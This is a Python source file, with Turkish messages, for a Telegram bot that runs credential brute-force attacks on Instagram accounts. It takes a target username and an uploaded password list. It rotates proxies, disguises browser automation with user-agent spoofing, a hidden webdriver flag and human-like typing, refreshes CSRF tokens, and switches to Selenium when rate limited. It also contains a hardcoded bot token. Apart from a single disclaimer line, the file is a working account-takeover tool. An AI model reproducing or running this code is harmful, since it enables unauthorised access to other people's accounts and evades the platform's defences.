import asyncio
import logging
import random
import time
import json
import re
import requests
import itertools
from typing import List, Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
from urllib.parse import quote
import base64
import os

# Log ayarları
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Telegram bot token
TOKEN = "6481633238:AAHMT8V8nHNUsQUm69F1ngczdiFTzJAQJfU"

class InstagramBruteForce:
    """Instagram brute-force işlemleri için sınıf - 2025 güncel versiyon."""
    
    def __init__(self, user_agent: str = None, proxy_list: List[str] = None):
        self.user_agent = user_agent or self._get_realistic_user_agent()
        self.proxy_list = proxy_list or []
        self.proxy_cycle = itertools.cycle(self.proxy_list) if self.proxy_list else None
        self.current_proxy = None
        self.login_url = 'https://www.instagram.com/accounts/login/'
        self.api_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
        self.session = None
        self.driver = None
        self.csrf_token = None
        self.mid_cookie = None
        self.ig_did = None
        self.rollout_hash = None
        self._initialize()

    def _get_realistic_user_agent(self):
        agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0"
        ]
        return random.choice(agents)

    def _initialize(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"'
        })
        if self.proxy_list:
            self.current_proxy = self._get_working_proxy()
            if self.current_proxy:
                self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                logger.debug(f"Başlangıç proxy'si ayarlandı: {self.current_proxy}")

    def _get_working_proxy(self, progress_callback: Optional[callable] = None):
        if not self.proxy_list or not self.proxy_cycle:
            if progress_callback:
                progress_callback("⚠️ Proxy listesi boş, proxysiz devam ediliyor...")
            return None
        for _ in range(len(self.proxy_list)):
            proxy = next(self.proxy_cycle)
            try:
                test_session = requests.Session()
                test_session.proxies = {'http': proxy, 'https': proxy}
                response = test_session.get('https://www.instagram.com', timeout=10)
                if response.status_code == 200:
                    test_session.close()
                    logger.debug(f"Çalışan proxy bulundu: {proxy}")
                    if progress_callback:
                        progress_callback(f"✅ Çalışan proxy bulundu: {proxy}")
                    return proxy
                else:
                    logger.warning(f"Proxy başarısız: {proxy}, HTTP {response.status_code}")
            except Exception as e:
                logger.warning(f"Proxy hatası: {proxy}, {str(e)}")
            asyncio.sleep(2)  # Proxy denemeleri arasında kısa bekleme
        logger.error("Hiçbir proxy çalışmıyor!")
        if progress_callback:
            progress_callback("❌ Hiçbir proxy çalışmıyor, proxysiz devam ediliyor...")
        return None

    def _setup_selenium(self):
        options = Options()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        options.add_argument(f'--user-agent={self.user_agent}')
        if self.current_proxy:
            options.add_argument(f'--proxy-server={self.current_proxy}')
        try:
            self.driver = webdriver.Chrome(options=options)
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            return True
        except Exception as e:
            logger.error(f"Selenium başlatılamadı: {e}")
            return False

    async def _get_initial_cookies_and_tokens(self, progress_callback: Optional[callable] = None):
        max_attempts = 50
        for attempt in range(1, max_attempts + 1):
            if self.proxy_list:
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                else:
                    self.session.proxies = {}
            
            try:
                response = self.session.get('https://www.instagram.com/', timeout=15)
                if response.status_code != 200:
                    raise Exception(f"Instagram'a erişilemiyor: {response.status_code}")
                self.mid_cookie = self.session.cookies.get('mid')
                self.ig_did = self.session.cookies.get('ig_did')
                response = self.session.get(self.login_url, timeout=15)
                self.csrf_token = self.session.cookies.get('csrftoken')
                if not self.csrf_token:
                    csrf_match = re.search(r'"csrf_token":"([^"]+)"', response.text)
                    if csrf_match:
                        self.csrf_token = csrf_match.group(1)
                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', response.text)
                if rollout_match:
                    self.rollout_hash = rollout_match.group(1)
                else:
                    self.rollout_hash = str(int(time.time()))
                logger.debug(f"Token'lar alındı: CSRF={self.csrf_token[:20]}..., Rollout={self.rollout_hash}")
                if progress_callback:
                    await progress_callback(f"✅ Token'lar alındı!")
                return self.csrf_token is not None
            except Exception as e:
                logger.error(f"Token alma hatası (Deneme {attempt}/{max_attempts}): {e}")
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                if attempt < max_attempts:
                    await asyncio.sleep(5)  # 5 saniye bekle
                continue
        if progress_callback:
            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
        return False

    async def _selenium_get_tokens(self, progress_callback: Optional[callable] = None):
        attempt = 1
        while True:
            if self.proxy_list:
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    if progress_callback:
                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                else:
                    self.current_proxy = None
                    if progress_callback:
                        await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
            
            if not self._setup_selenium():
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                await asyncio.sleep(5)
                attempt += 1
                continue
            try:
                self.driver.get('https://www.instagram.com/')
                time.sleep(3)
                self.driver.get(self.login_url)
                time.sleep(2)
                csrf_token = self.driver.get_cookie('csrftoken')
                if csrf_token:
                    self.csrf_token = csrf_token['value']
                mid_cookie = self.driver.get_cookie('mid')
                if mid_cookie:
                    self.mid_cookie = mid_cookie['value']
                ig_did = self.driver.get_cookie('ig_did')
                if ig_did:
                    self.ig_did = ig_did['value']
                page_source = self.driver.page_source
                rollout_match = re.search(r'"rollout_hash":"([^"]+)"', page_source)
                if rollout_match:
                    self.rollout_hash = rollout_match.group(1)
                logger.debug(f"Selenium ile token'lar alındı: CSRF={self.csrf_token[:20]}...")
                if progress_callback:
                    await progress_callback(f"✅ Selenium ile token'lar alındı!")
                return self.csrf_token is not None
            except Exception as e:
                logger.error(f"Selenium token alma hatası (Deneme {attempt}): {e}")
                if progress_callback:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                await asyncio.sleep(5)
                attempt += 1
            finally:
                if self.driver:
                    self.driver.quit()
                    self.driver = None

    def _make_login_request(self, username: str, password: str):
        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,tr;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://www.instagram.com',
            'Referer': self.login_url,
            'X-CSRFToken': self.csrf_token,
            'X-Instagram-AJAX': self.rollout_hash,
            'X-IG-App-ID': '936619743392459',
            'X-IG-WWW-Claim': '0',
            'X-Requested-With': 'XMLHttpRequest',
        }
        timestamp = int(time.time())
        enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{timestamp}:{password}"
        data = {
            'username': username,
            'enc_password': enc_password,
            'queryParams': '{}',
            'optIntoOneTap': 'false',
            'stopDeletionNonce': '',
            'trustedDeviceRecords': '{}'
        }
        try:
            response = self.session.post(self.api_url, headers=headers, data=data, timeout=15)
            logger.debug(f"API Yanıtı: {response.text}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Yanıt: {response.text}\n")
            return response
        except Exception as e:
            logger.error(f"Login request hatası (Şifre: {password}): {e}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Hata: {str(e)}\n")
            return None

    def _selenium_login_attempt(self, username: str, password: str):
        if not self._setup_selenium():
            return "ERROR"
        try:
            self.driver.get(self.login_url)
            WebDriverWait(self.driver, 10).until(
                EC.presence_of_element_located((By.NAME, "username"))
            )
            username_field = self.driver.find_element(By.NAME, "username")
            password_field = self.driver.find_element(By.NAME, "password")
            for char in username:
                username_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            time.sleep(random.uniform(0.5, 1))
            for char in password:
                password_field.send_keys(char)
                time.sleep(random.uniform(0.1, 0.3))
            time.sleep(random.uniform(1, 2))
            login_button = self.driver.find_element(By.XPATH, "//button[@type='submit']")
            login_button.click()
            time.sleep(5)
            current_url = self.driver.current_url
            page_source = self.driver.page_source
            if any(indicator in current_url for indicator in ['/', '/direct/', '/explore/', '/accounts/onetap/']):
                if 'accounts/login' not in current_url:
                    logger.debug("Selenium: Başarılı giriş tespit edildi")
                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
                        f.write(f"Şifre: {password}, Selenium: Başarılı giriş\n")
                    return "SUCCESS"
            if any(indicator in current_url for indicator in ['two_factor', '2fa']) or \
               any(indicator in page_source for indicator in ['two_factor', 'Enter the 6-digit code']):
                logger.debug("Selenium: 2FA gerekli")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: 2FA gerekli\n")
                return "2FA"
            if 'checkpoint' in current_url or 'challenge' in current_url:
                logger.debug("Selenium: Checkpoint gerekli")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: Checkpoint gerekli\n")
                return "CHECKPOINT"
            error_indicators = [
                'Sorry, your password was incorrect',
                'The username you entered',
                'incorrect',
                'doesn\'t match',
                'kullanıcı adı',
                'Hatalı şifre',
                'Şifre yanlış',
                'Please check your username',
                'Giriş yapamadık',
                'Lütfen kullanıcı adınızı kontrol edin',
                'The password you entered is incorrect',
                'Please try again'
            ]
            if any(indicator in page_source for indicator in error_indicators):
                logger.debug("Selenium: Yanlış şifre tespit edildi")
                with open('instagram_response.json', 'a', encoding='utf-8') as f:
                    f.write(f"Şifre: {password}, Selenium: Yanlış şifre\n")
                return "WRONG"
            try:
                error_message = self.driver.find_element(By.XPATH, "//div[@id='error_message'] | //p[@id='slfErrorAlert'] | //div[contains(@class, 'error')]")
                if error_message:
                    logger.debug(f"Selenium: Hata mesajı bulundu: {error_message.text}")
                    with open('instagram_response.json', 'a', encoding='utf-8') as f:
                        f.write(f"Şifre: {password}, Selenium: Hata mesajı - {error_message.text}\n")
                    return "WRONG"
            except NoSuchElementException:
                pass
            logger.debug("Selenium: Bilinmeyen durum")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Selenium: Bilinmeyen durum\n")
            return "UNKNOWN"
        except Exception as e:
            logger.error(f"Selenium login hatası (Şifre: {password}): {e}")
            with open('instagram_response.json', 'a', encoding='utf-8') as f:
                f.write(f"Şifre: {password}, Selenium Hata: {str(e)}\n")
            return "ERROR"
        finally:
            if self.driver:
                self.driver.quit()
                self.driver = None

    async def brute_force(self, username: str, password_list: List[str], timeout: int, 
                         progress_callback: Optional[callable] = None):
        start_time = time.time()
        total_passwords = len(password_list)
        potential_passwords = []  # Hata alan şifreleri saklamak için
        
        await progress_callback(f"\n{'='*50}\nInstagram Brute Force Başlatılıyor\nHedef: {username}\nToplam şifre: {total_passwords}\nTimeout: {timeout} saniye\n{'='*50}\n")
        await progress_callback("🔧 Token'lar alınıyor...")
        
        success = await self._get_initial_cookies_and_tokens(progress_callback)
        if not success:
            await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
            success = await self._selenium_get_tokens(progress_callback)
        
        if not success:
            await progress_callback("❌ Token'lar alınamadı, işlem durduruluyor!")
            return None

        await progress_callback(f"✅ Token'lar alındı!")

        failed_attempts = 0
        max_failed = 5

        for i, password in enumerate(password_list):
            if time.time() - start_time > timeout:
                await progress_callback(f"\n⏰ Timeout ({timeout}s) aşıldı!")
                break

            # Her şifre denemesinde proxy değiştir
            if self.proxy_list:
                await progress_callback("🔄 Proxy değiştiriliyor...")
                self.current_proxy = self._get_working_proxy(progress_callback)
                if self.current_proxy:
                    self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                    await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                else:
                    self.session.proxies = {}
                    await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")

            await progress_callback(f"🔐 Şifre deneniyor: {password}")

            response = self._make_login_request(username, password)
            result = "ERROR"
            
            if response:
                if response.status_code == 200:
                    try:
                        json_data = response.json()
                        logger.debug(f"JSON Yanıtı: {json_data}")
                        if json_data.get('authenticated'):
                            await progress_callback(f"🎉 BAŞARILI! Şifre bulundu: {password}")
                            return password
                        elif json_data.get('authenticated') == False:
                            result = "WRONG"
                            await progress_callback(f"❌ Yanlış şifre: {password}")
                        elif json_data.get('two_factor_required'):
                            await progress_callback(f"🔐 2FA gerekli! Şifre doğru: {password}")
                            return password
                        elif json_data.get('checkpoint_url'):
                            await progress_callback(f"🚧 Checkpoint gerekli! Şifre doğru: {password}")
                            return password
                        elif 'incorrect' in json_data.get('message', '').lower() or \
                             'error' in json_data.get('status', '').lower():
                            result = "WRONG"
                            await progress_callback(f"❌ Yanlış şifre: {password}")
                        else:
                            result = "UNKNOWN"
                            await progress_callback(f"❓ Bilinmeyen yanıt (Şifre: {password}), loglara kaydedildi, devam ediyorum...")
                    except json.JSONDecodeError:
                        potential_passwords.append(password)
                        await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                        result = self._selenium_login_attempt(username, password)
                elif response.status_code == 429:
                    potential_passwords.append(password)
                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                    await asyncio.sleep(30)
                    result = self._selenium_login_attempt(username, password)
                else:
                    potential_passwords.append(password)
                    await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                    result = self._selenium_login_attempt(username, password)
            else:
                potential_passwords.append(password)
                await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, Selenium deneniyor...")
                result = self._selenium_login_attempt(username, password)

            if result == "SUCCESS":
                await progress_callback(f"🎉 BAŞARILI! (Selenium) Şifre bulundu: {password}")
                return password
            elif result == "2FA":
                await progress_callback(f"🔐 2FA gerekli! (Selenium) Şifre doğru: {password}")
                return password
            elif result == "CHECKPOINT":
                await progress_callback(f"🚧 Checkpoint gerekli! (Selenium) Şifre doğru: {password}")
                return password
            elif result == "ERROR":
                potential_passwords.append(password)
                await progress_callback(f"🔄 Hata oldu (Şifre: {password}), loglara kaydedildi, tekrar deniyorum...")
                failed_attempts += 1
                if failed_attempts >= max_failed:
                    if self.proxy_list:
                        await progress_callback("🔄 Proxy değiştiriliyor...")
                        self.current_proxy = self._get_working_proxy(progress_callback)
                        if self.current_proxy:
                            self.session.proxies = {'http': self.current_proxy, 'https': self.current_proxy}
                            await progress_callback(f"✅ Yeni proxy ayarlandı: {self.current_proxy}")
                            failed_attempts = 0
                        else:
                            await progress_callback("🔍 Çalışan proxy bulunamadı, proxysiz devam ediyorum...")
                            await asyncio.sleep(60)
                    else:
                        await progress_callback("🔍 60 saniye bekleniyor...")
                        await asyncio.sleep(60)
                        failed_attempts = 0

            if (i + 1) % 5 == 0:
                await progress_callback("🔄 Token'lar yenileniyor...")
                success = await self._get_initial_cookies_and_tokens(progress_callback)
                if not success:
                    await progress_callback("🔍 Token bulmaya çalışıyorum, sabret... (Selenium'a geçiliyor)")
                    success = await self._selenium_get_tokens(progress_callback)
                if not success:
                    await progress_callback("🔍 Token'lar alınamadı, devam ediyorum...")

            delay = random.uniform(20, 40)
            await progress_callback(f"⏳ {delay:.1f}s bekleniyor...")
            await asyncio.sleep(delay)

        # Hata alan şifreleri raporla
        if potential_passwords:
            await progress_callback(f"🔍 Hata alan şifreler (doğru olabilir, kontrol et): {', '.join(potential_passwords)}")
        await progress_callback("❌ Tüm şifreler denendi, doğru şifre bulunamadı.")
        return None

class TelegramBot:
    def __init__(self):
        self.user_data = {}
        self.brute_force_tasks = {}

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        self.user_data[user_id] = {'username': None, 'password_file': None, 'proxy_file': None, 'timeout': 1800}
        
        welcome_message = (
            "👾 **HACKER V3.0 AKTİF!** 👾\n"
            "🔥 Instagram Brute Force Botuna Hoş Geldin! 🔥\n"
            "💻 Bu bot, hedef Instagram hesaplarını test etmek için tasarlandı.\n"
            "⚠️ **Yasal Uyarı**: Bu aracı yalnızca kendi hesabınız veya izinli testler için kullanın!\n\n"
            "🚀 Başlamak için aşağıdaki seçeneklerden birini seç:"
        )
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(welcome_message, reply_markup=reply_markup, parse_mode='Markdown')

    async def button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        if query.data == 'set_username':
            await query.message.reply_text("🎯 Lütfen Instagram kullanıcı adını gir:")
            context.user_data['awaiting'] = 'username'
        elif query.data == 'set_password_file':
            await query.message.reply_text("📜 Lütfen şifre listesi dosyasını (.txt) yükle:")
            context.user_data['awaiting'] = 'password_file'
        elif query.data == 'set_proxy_file':
            await query.message.reply_text("🌐 Lütfen proxy listesi dosyasını (.txt) yükle (isteğe bağlı):")
            context.user_data['awaiting'] = 'proxy_file'
        elif query.data == 'set_timeout':
            await query.message.reply_text("⏰ Lütfen timeout süresini (saniye) gir (60-7200 arası):")
            context.user_data['awaiting'] = 'timeout'
        elif query.data == 'start_attack':
            await self.start_attack(update, context)

    async def handle_message(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_data:
            self.user_data[user_id] = {'username': None, 'password_file': None, 'proxy_file': None, 'timeout': 1800}

        awaiting = context.user_data.get('awaiting')
        if not awaiting:
            return

        if awaiting == 'username':
            self.user_data[user_id]['username'] = update.message.text.strip()
            await update.message.reply_text(f"✅ Kullanıcı adı ayarlandı: {self.user_data[user_id]['username']}")
        elif awaiting == 'password_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"passwords_{user_id}.txt"
                await file.download_to_drive(file_path)
                self.user_data[user_id]['password_file'] = file_path
                await update.message.reply_text("✅ Şifre listesi yüklendi!")
            else:
                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                return
        elif awaiting == 'proxy_file':
            if update.message.document:
                file = await update.message.document.get_file()
                file_path = f"proxies_{user_id}.txt"
                await file.download_to_drive(file_path)
                self.user_data[user_id]['proxy_file'] = file_path
                await update.message.reply_text("✅ Proxy listesi yüklendi!")
            else:
                await update.message.reply_text("❌ Lütfen bir .txt dosyası yükle!")
                return
        elif awaiting == 'timeout':
            try:
                timeout = int(update.message.text)
                if 60 <= timeout <= 7200:
                    self.user_data[user_id]['timeout'] = timeout
                    await update.message.reply_text(f"✅ Timeout ayarlandı: {timeout} saniye")
                else:
                    await update.message.reply_text("❌ Timeout 60-7200 saniye arasında olmalı!")
            except ValueError:
                await update.message.reply_text("❌ Lütfen geçerli bir sayı gir!")
            return

        context.user_data['awaiting'] = None
        keyboard = [
            [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
            [InlineKeyboardButton("📜 Şifre Listesi Yükle", callback_data='set_password_file')],
            [InlineKeyboardButton("🌐 Proxy Listesi Yükle", callback_data='set_proxy_file')],
            [InlineKeyboardButton("⏰ Timeout Ayarla", callback_data='set_timeout')],
            [InlineKeyboardButton("🚀 Saldırıyı Başlat", callback_data='start_attack')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("➡️ Başka ne yapmak istersin?", reply_markup=reply_markup)

    async def start_attack(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        query = update.callback_query

        # Saldırı başlatıldığında bilgilendirme mesajı
        await query.message.reply_text("🚀 Saldırı başladığında bildirileceksin, şu an gerekli kurulumlar yapılıyor...")

        if user_id in self.brute_force_tasks and not self.brute_force_tasks[user_id].done():
            await query.message.reply_text("⚠️ Saldırı zaten devam ediyor!")
            return

        if not self.user_data[user_id]['username']:
            await query.message.reply_text("❌ Lütfen önce kullanıcı adı gir!")
            return
        if not self.user_data[user_id]['password_file'] or not os.path.exists(self.user_data[user_id]['password_file']):
            await query.message.reply_text("❌ Lütfen geçerli bir şifre listesi yükle!")
            return

        try:
            passwords = []
            encodings = ['utf-8', 'latin-1', 'iso-8859-9']
            for encoding in encodings:
                try:
                    with open(self.user_data[user_id]['password_file'], 'r', encoding=encoding, errors='ignore') as f:
                        passwords = [line.strip() for line in f if line.strip()]
                    break
                except UnicodeDecodeError:
                    continue

            if not passwords:
                await query.message.reply_text("❌ Şifre dosyası okunamadı! Geçerli bir dosya yükle.")
                return

            proxy_list = []
            if self.user_data[user_id]['proxy_file'] and os.path.exists(self.user_data[user_id]['proxy_file']):
                for encoding in encodings:
                    try:
                        with open(self.user_data[user_id]['proxy_file'], 'r', encoding=encoding, errors='ignore') as f:
                            proxy_list = [line.strip() for line in f if line.strip()]
                        break
                    except UnicodeDecodeError:
                        continue

            core = InstagramBruteForce(proxy_list=proxy_list)

            async def progress_callback(message):
                await query.message.reply_text(message)

            task = asyncio.create_task(
                core.brute_force(
                    self.user_data[user_id]['username'],
                    passwords,
                    self.user_data[user_id]['timeout'],
                    progress_callback=progress_callback
                )
            )
            self.brute_force_tasks[user_id] = task
            result = await task
            if result:
                await query.message.reply_text(f"🎉 **BAŞARILI! Şifre bulundu: {result}**", parse_mode='Markdown')
            else:
                await query.message.reply_text("❌ Tüm şifreler denendi, doğru şifre bulunamadı.", parse_mode='Markdown')

        except Exception as e:
            await query.message.reply_text(f"❌ Başlatma hatası: {str(e)}", parse_mode='Markdown')
        finally:
            if user_id in self.brute_force_tasks:
                del self.brute_force_tasks[user_id]

async def main():
    bot = TelegramBot()
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", bot.start))
    application.add_handler(CallbackQueryHandler(bot.button))
    application.add_handler(MessageHandler(filters.TEXT | filters.Document.ALL, bot.handle_message))
    await application.run_polling()

if __name__ == "__main__":
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())